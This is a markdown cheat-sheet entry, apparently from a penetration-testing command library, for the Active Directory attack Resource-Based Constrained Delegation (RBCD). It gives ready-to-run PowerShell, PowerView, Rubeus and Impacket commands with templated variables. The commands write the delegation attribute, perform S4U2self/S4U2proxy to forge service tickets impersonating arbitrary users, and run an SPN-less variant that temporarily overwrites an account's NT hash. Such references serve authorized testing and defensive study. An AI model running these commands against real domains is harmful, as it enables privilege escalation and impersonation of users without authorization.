---
technique: ResourceBasedConstrainedDelegation
category: kerberos-delegation
targets: Domain Computer, Domain User, Service Account
protocols: Kerberos, LDAP
remote_capable: true
tags: kerberos delegation rbcd msds-allowedtoactonbehalfofotheridentity s4u ad impersonation
---

# Resource-Based Constrained Delegation (RBCD)

When an attacker controls an account with write access to a target object's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute (for example via GenericWrite), that attribute can be populated with a controlled account's SID. The controlled account is then used to perform S4U2self + S4U2proxy, producing a service ticket that impersonates any user (except those marked sensitive or in Protected Users, with the native RID-500 Administrator being exempt) against the target. The attack also works without creating a new machine account by abusing an SPN-less user with S4U2self + U2U, though this makes the sacrificial account temporarily unusable.

## Windows

PowerView, the AD module, or StandIn write the delegation attribute; Rubeus then performs the S4U exchange.

### Set-ADComputer (RSAT)

#powershell #rsat #ldap

Write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute using the built-in AD PowerShell module.

```powershell title:"Set RBCD attribute via RSAT AD module"
Set-ADComputer "$target_computer" -PrincipalsAllowedToDelegateToAccount "$controlled_account"
```
<!-- cheat
var target_computer
var controlled_account
-->

### PowerView: resolve controlled SID

#powershell #powerview #ldap

Resolve the controlled computer SID before building the RBCD security descriptor.

```powershell title:"Resolve controlled account SID via PowerView"
$controlled_sid = Get-DomainComputer "$controlled_account" -Properties objectsid | Select -Expand objectsid
```
<!-- cheat
var controlled_account
-->

### PowerView: create RBCD descriptor

#powershell #powerview #ldap

Create a raw security descriptor that grants the controlled SID the RBCD rights.

```powershell title:"Create RBCD security descriptor"
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($controlled_sid))"
```
<!-- cheat
var controlled_sid := $controlled_sid
-->

### PowerView: allocate descriptor bytes

#powershell #powerview #ldap

Allocate a byte array for the serialized RBCD security descriptor.

```powershell title:"Allocate RBCD descriptor byte array"
$sd_bytes = New-Object byte[] ($sd.BinaryLength)
```
<!-- cheat
var sd := $sd
-->

### PowerView: serialize descriptor

#powershell #powerview #ldap

Serialize the RBCD security descriptor to bytes for LDAP storage.

```powershell title:"Serialize RBCD descriptor to bytes"
$sd.GetBinaryForm($sd_bytes, 0)
```
<!-- cheat
var sd_bytes := $sd_bytes
-->

### PowerView: write RBCD attribute

#powershell #powerview #ldap

Write the RBCD attribute using PowerView's Set-DomainObject.

```powershell title:"Set RBCD attribute via PowerView"
Get-DomainComputer "$target_computer" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sd_bytes}
```
<!-- cheat
var target_computer
var sd_bytes := $sd_bytes
-->

### Rubeus s4u

#powershell #rubeus #s4u

Perform the S4U2self + S4U2proxy exchange using the controlled account's credentials to obtain a service ticket impersonating the target user.

```powershell title:"RBCD S4U attack via Rubeus"
.\Rubeus.exe s4u /nowrap /impersonateuser:"$impersonate_user" /msdsspn:"$target_spn" /domain:"$domain" /user:"$controlled_account" /rc4:"$nt_hash"
```
<!-- cheat
import users
var impersonate_user
var target_spn
var domain
var controlled_account
var nt_hash
-->

## Linux

rbcd.py sets the delegation attribute and getST.py performs the S4U exchange; Impacket handles both steps cleanly.

### rbcd.py

#python #impacket #ldap

Write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target using rbcd.py with the powerful account's credentials.

```sh title:"Set RBCD attribute via Impacket rbcd.py"
rbcd.py -delegate-from "$controlled_account" -delegate-to "$target_computer$" -dc-ip "$rhost_ip" -action write "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
var controlled_account
var target_computer
var domain
-->

### getST.py

#python #impacket #s4u

Perform S4U2self + S4U2proxy with the controlled account's credentials to obtain a service ticket impersonating the chosen user.

```sh title:"RBCD S4U attack via Impacket getST.py"
getST.py -spn "$target_spn" -impersonate "$impersonate_user" -dc-ip "$rhost_ip" "$domain"/"$controlled_account":"$controlled_pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
var target_spn
var impersonate_user
var domain
var controlled_account
var controlled_pass
-->

### export KRB5CCNAME (getST.py)

#shell #env

Set KRB5CCNAME to the ccache file written by getST.py so subsequent Kerberos tools pick up the ticket.

```sh title:"Load getST.py ccache into KRB5CCNAME"
export KRB5CCNAME="$impersonate_user.ccache"
```
<!-- cheat
var impersonate_user
-->

### Step 1: get TGT session key (SPN-less RBCD)

#python #impacket #u2u #spnless

Request a TGT for the controlled account and extract the session key needed to temporarily replace its NT hash.

```sh title:"Request TGT and extract session key for SPN-less RBCD"
getTGT.py -hashes :$(pypykatz crypto nt "$controlled_pass") "$domain"/"$controlled_account"
```
<!-- cheat
import domain_ip
var domain
var controlled_account
var controlled_pass
-->

### Step 2: read ticket session key (SPN-less RBCD)

#python #impacket #u2u #spnless

Read the session key from the TGT ccache so it can be used as a temporary NT hash.

```sh title:"Describe TGT ccache and read session key"
describeTicket.py "$controlled_account.ccache" | grep 'Ticket Session Key'
```
<!-- cheat
var controlled_account
-->

### Step 3: set NT hash to session key (SPN-less RBCD)

#python #impacket #u2u #spnless

Overwrite the controlled account's NT hash with the TGT session key to enable the S4U2self + U2U exchange.

```sh title:"Set controlled account NT hash to TGT session key"
changepasswd.py -newhashes :"$tgt_session_key" "$domain"/"$controlled_account":"$controlled_pass"@"$rhost_ip"
```
<!-- cheat
import domain_ip
var dc_ip
var domain
var controlled_account
var controlled_pass
var tgt_session_key
-->

### Step 4: S4U2self + U2U (SPN-less RBCD)

#python #impacket #u2u #spnless

Use the modified account with the session-key hash to perform S4U2self + U2U and obtain a service ticket impersonating the target user.

```sh title:"S4U2self+U2U service ticket via Impacket getST"
KRB5CCNAME="$controlled_account.ccache" getST.py -u2u -impersonate "$impersonate_user" -spn "$target_spn" -k -no-pass "$domain"/"$controlled_account"
```
<!-- cheat
import domain_ip
var domain
var controlled_account
var impersonate_user
var target_spn
-->

### Step 5: restore original NT hash (SPN-less RBCD)

#python #impacket #u2u #spnless

Restore the controlled account's original NT hash to return the account to normal operation.

```sh title:"Restore original NT hash after SPN-less RBCD"
changepasswd.py -hashes :"$tgt_session_key" -newhashes :"$original_nt_hash" "$domain"/"$controlled_account"@"$rhost_ip"
```
<!-- cheat
import domain_ip
var dc_ip
var domain
var controlled_account
var tgt_session_key
var original_nt_hash
-->
